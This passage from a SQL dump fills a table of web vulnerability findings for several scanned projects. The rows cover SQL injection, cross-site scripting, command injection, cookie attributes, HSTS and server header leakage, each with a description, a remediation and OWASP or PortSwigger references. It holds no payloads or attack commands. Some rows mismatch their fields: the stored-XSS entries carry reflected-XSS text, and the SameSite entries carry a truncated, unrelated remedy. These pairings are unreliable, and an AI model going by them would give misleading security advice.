'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 233, 'High'),
(334, 'Directory Traversal File Include', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-ATHZ-01', 233, 'Medium'),
(336, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 234, 'High'),
(337, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 234, 'High'),
(338, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 234, 'Medium'),
(339, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 234, 'Low'),
(340, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 234, 'Low'),
(341, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 234, 'Low'),
(342, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 234, 'Low'),
(343, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 235, 'High'),
(344, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 235, 'High'),
(345, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 235, 'Medium'),
(346, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 235, 'Low'),
(347, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 235, 'Low'),
(348, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 235, 'Low'),
(349, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 235, 'Low'),
(350, 'Directory Traversal File Include', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-ATHZ-01', 235, 'Medium'),
(351, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 235, 'Low'),
(352, 'Missing HttpOnly Attribute in Cookie Header', 'The HttpOnly attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.', 'Implement HttpOnly Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 235, 'Low'),
(353, 'Command Injection', 'Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.\n\nOS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application\'s own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.', 'If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.\n\nIf it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks:\n\nThe user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.\nThe application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses.', 'https://portswigger.net/kb/issues/00100100_os-command-injection', NULL, 'WSTG-INPV-12', 235, 'High'),
(354, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 235, 'Low'),
(355, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 236, 'High'),
(356, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 236, 'High'),
(357, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 236, 'Medium'),
(358, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 236, 'Low'),
(359, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 236, 'Low'),
(360, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 236, 'Low'),
(361, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 236, 'Low'),
(362, 'Directory Traversal File Include', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-ATHZ-01', 236, 'Medium');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(363, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 88, 'High'),
(364, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 91, 'High'),
(365, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 91, 'Low'),
(366, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 91, 'Low'),
(367, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 91, 'Low'),
(368, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 91, 'High'),
(369, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in 